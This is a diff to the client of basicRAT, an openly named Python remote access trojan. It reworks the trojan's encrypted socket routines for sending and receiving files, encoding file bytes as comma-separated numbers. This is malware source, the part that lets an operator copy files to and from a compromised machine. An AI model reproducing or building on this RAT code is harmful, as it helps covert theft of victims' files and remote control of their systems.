@@ -5,6 +5,7 @@
 # https://github.com/vesche/basicRAT
 #
 
+import base64
 import crypto
 import os
 import socket
@@ -50,34 +51,44 @@ class Client(object):
         ciphertext = m[12:-16]
         tag = crypto.bytes_to_long(m[-16:])
 
-        #try:
-        data = self.GCM.decrypt(IV, ciphertext, tag)
-        #except:
-        #    data = ''
-        #    pass
-
-        return data
+        return self.GCM.decrypt(IV, ciphertext, tag)
 
     # recieve a file from a socket (download)
     def recvfile(self, fname):
         if os.path.isfile(fname):
             return
+
+        data = self.recvGCM()
+        data = data.split(',')
+        data = filter(lambda a: a != '', data)
+        data = ''.join(map(chr, map(int, data)))
+
         with open(fname, 'wb') as f:
-            # data = self.recvGCM()
-            # f.write(data)
-            data = 1
-            while data:
-                data = self.recvGCM()
-                f.write(data)
+            f.write(data)
+
+        #with open(fname, 'wb') as f:
+        #    data = self.recvGCM()
+        #    while data:
+        #        data = data.split(',')
+        #        data = filter(lambda a: a != '', data)
+        #        data = ''.join(map(chr, map(int, data)))
+        #        f.write(data)
+        #        data = self.recvGCM()
 
     # send a file over a socket (upload)
     def sendfile(self, fname):
         if not os.path.isfile(fname):
             return
+
         with open(fname, 'rb') as f:
-            # res = f.read(4096)
-            # self.sendGCM(res)
-            res = 1
-            while res:
-                res = f.read(4096)
-                self.sendGCM(res)
+            data = f.read()
+
+        data = ','.join(map(str, map(ord, data)))
+        self.sendGCM(data)
+
+        #with open(fname, 'rb') as f:
+        #    data = f.read(4096)
+        #    while data:
+        #        data = ','.join(map(str, map(ord, data)))
+        #        self.sendGCM(data)
+        #        data = f.read(4096)
